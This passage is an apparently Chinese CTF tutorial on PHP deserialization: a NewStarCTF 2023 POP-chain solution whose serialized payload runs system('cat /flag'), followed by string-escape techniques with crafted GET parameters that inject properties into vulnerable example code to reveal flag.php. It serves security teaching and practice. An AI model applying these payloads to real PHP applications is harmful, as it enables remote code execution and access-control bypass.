<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[a-zA-Z0-9]/"</span>,<span class="variable">$this</span>-&gt;name)){</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Hello"</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Welcome to NewStarCTF 2023!"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();  <span class="comment">//$this-&gt;func=new 类名();</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Good Job!"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"call"</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)  //  字母数字(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"invoke"</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"==GAME OVER=="</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"end"</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;func = <span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func=<span class="string">'system'</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;<span class="keyword">var</span>=<span class="string">'cat /flag'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A3%3A%22obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A3%3A%22obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D%7D%7D%7D%7D%7D</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>反序列化分隔符</p>
<p>反序列化以 ;} 结束，后面的字符串不影响正常的反序列化</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//序列化结果中双引号是字符还是格式符号是由字符串长度判断的</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">A</span></span>{</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$v1</span>=<span class="string">"a\"b"</span>;<span class="comment">// 反斜杠作用是取消"的作用，使其成为字符</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"> <span class="comment">//O:1:"A":1:{s:2:"v1";s:3:"a"b";}这里的a"b就是字符</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";N;}s:2:"v2";N;}'</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">/*前面字符串没有问题的情况下，;}是反序列化结束符,后面的字符串不影响反序列化结果,这个代码依然可以</span></span><br><span class="line"><span class="comment">运行。</span></span><br><span class="line"><span class="comment">ject(A)#1 (2) {</span></span><br><span class="line"><span class="comment"> ["v1"]=&gt;</span></span><br><span class="line"><span class="comment"> string(1) "a"</span></span><br><span class="line"><span class="comment"> ["v2"]=&gt;</span></span><br><span class="line"><span class="comment"> NULL</span></span><br><span class="line"><span class="comment"> }*/</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><strong>属性逃逸</strong></p>
<p>一般在数据先经过一次serialize在经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p>
<h4 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">"abcsystem()system()system()"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">'123'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">'v1'</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">'v2'</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">"system()"</span>,<span class="string">""</span>,<span class="variable">$data</span>);   <span class="comment">//str_replace把system()替换为空</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>此处，我们为了区分，逃逸出v3</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">"abcsystem()system()system()"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">'123'</span>;</span><br><span class="line"> }</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="comment">//O:1:"A":2:{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:3:"123";}</span></span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">"system()"</span>,<span class="string">""</span>,<span class="variable">$data</span>);</span><br><span class="line"> <span class="comment">//O:1:"A":2:{s:2:"v1";s:27:"abc";s:2:"v2";s:3:"123";}</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>经过替换后，导致序列化结果中字符串长度是不对的，会导致吃掉后面的字符</p>
<p>那么我们先构造我们想要逃逸出来的代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">";s:2:"v3";i:123;}      //";是为了与前面形成闭合</span><br></pre></td></tr></tbody></table></figure>

<p>然后我们需要控制v2，以及v1中system()的数量，来达成目的。开始计算：</p>
<p>将123替换为我们想要的代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">O:1:"A":2:{s:2:"v1";s:?:"abc";s:2:"v2";s:xx:"";s:2:"v3";i:123;}";}</span><br></pre></td></tr></tbody></table></figure>

<p>xx是因为我们后面构造的字符一般个数大于10</p>
<p>**abc”;s:2:”v2”;s:xx:”**这20个是我们想要吃掉的</p>
<p>一个system()八个字符，三个system()+abc一共27个字符</p>
<p>所以在我们想要的代码前面加七个字符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1234567";s:2:"v3";i:123;}    </span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">abc";s:2:"v2";s:xx:"1234567    //共27个字符</span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">"abcsystem()system()system()"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">'1234567";s:2:"v3";i:123;}'</span>;</span><br><span class="line"> }</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="comment">//O:1:"A":2:{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:25:"1234567";s:2:"v3";i:123;}";}</span></span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">"system()"</span>,<span class="string">""</span>,<span class="variable">$data</span>);</span><br><span class="line"> <span class="comment">//O:1:"A":2:{s:2:"v1";s:27:"abc";s:2:"v2";s:25:"1234567";s:2:"v3";i:123;}";}</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">     </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> class A#1 (3) {</span></span><br><span class="line"><span class="comment">  public $v1 =&gt;</span></span><br><span class="line"><span class="comment">  string(27) "abc";s:2:"v2";s:25:"1234567"</span></span><br><span class="line"><span class="comment">  public $v2 =&gt;</span></span><br><span class="line"><span class="comment">  string(25) "1234567";s:2:"v3";i:123;}"</span></span><br><span class="line"><span class="comment">  public $v3 =&gt;</span></span><br><span class="line"><span class="comment">  int(123)</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure>

<p>至此看到我们成功逃逸出v3</p>
<p><strong>例题</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>{</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">"flag"</span>,<span class="string">"php"</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">"hk"</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">'user'</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip){</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>构造出我们想要的代码</p>
<p>$vip = true</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">'flag'</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">'benben'</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:"test":3:{s:4:"user";s:4:"flag";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>**”;s:4:”pass”;s:xx:”**是要吃掉的    19位    多吃一位在后面补</p>
<p>因为前面O:4:”test”:3:这里是3，所以后面需要三个，那么</p>
<p>**”;s:4:”pass”;s:6:”benben”;s:3:”vip”;b:1;}**这个是最后的目标代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user=flagflagflagflagflagflagflagflagflagflag</span><br><span class="line">pass=1";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}</span><br></pre></td></tr></tbody></table></figure>

<p>也可以</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user=flagflagflagflagflagflagflagflagflagphp //这里正好吃掉19位后面就不用补了</span><br><span class="line">pass=";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}</span><br></pre></td></tr></tbody></table></figure>





<h4 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">'ls'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">'123'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">'v1'</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">'v2'</span>];</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">"ls"</span>,<span class="string">"pwd"</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></tbody></table></figure>

<p>目的: 逃逸出v3=666</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">'ls'</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">'123'</span>;</span><br><span class="line"> }</span><br><span class="line"> <span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">"ls"</span>,<span class="string">"pwd"</span>,<span class="variable">$data</span>);<span class="comment">//将ls换成pwd</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="comment">//O:1:"A":2:{s:2:"v1";s:2:"pwd";s:2:"v2";s:3:"123";}</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>构造我们需要的代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">";s:2:"v3";i:666;}</span><br></pre></td></tr></tbody></table></figure>

<p>需要吐出18个字符 一个ls转换成pwd吐出来一个字符，那么需要18个ls</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">lslslslslslslslslslslslslslslslslsls";s:2:"v3";i:666;}</span><br></pre></td></tr></tbody></table></figure>

<p>成功逃逸出v3</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{    </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">'lslslslslslslslslslslslslslslslslsls";s:2:"v3";i:666;}'</span>;  </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">'123'</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="comment">//O:1:"A":2:{s:2:"v1";s:54:"lslslslslslslslslslslslslslslslslsls";s:2:"v3";i:666;}";s:2:"v2";s:3:"123";}</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">"ls"</span>,<span class="string">"pwd"</span>,<span class="variable">$data</span>);<span class="comment">//将ls换成pwd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:"A":2:{s:2:"v1";s:54:"pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd";s:2:"v3";i:666;}";s:2:"v2";s:3:"123";}</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">     </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> class A#1 (3) {</span></span><br><span class="line"><span class="comment">  public $v1 =&gt;</span></span><br><span class="line"><span class="comment">  string(54) "pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd"</span></span><br><span class="line"><span class="comment">  public $v2 =&gt;</span></span><br><span class="line"><span class="comment">  string(3) "123"</span></span><br><span class="line"><span class="comment">  public $v3 =&gt;</span></span><br><span class="line"><span class="comment">  int(666)</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure>



<p><strong>例题</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>{</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">"flag"</span>,<span class="string">"php"</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">"hack"</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">'daydream'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">'param'</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">'escaping'</span>){</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">'php'</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">'escaping'</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:"test":2:{s:4:"user";s:3:"php";s:4:"pass";s:8:"escaping";}</span></span><br></pre></td></tr></tbody></table></figure>



<p>我们想要的</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">";s:4:"pass";s:8:"escaping";}  //29</span><br></pre></td></tr></tbody></table></figure>

<p>一个php替换成hack 吐出一个字符</p>
<p>那么就需要29个php</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h3><p>php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时， 另一个变量的值也会随之改变。</p>
<p><strong>例题</strong></p>
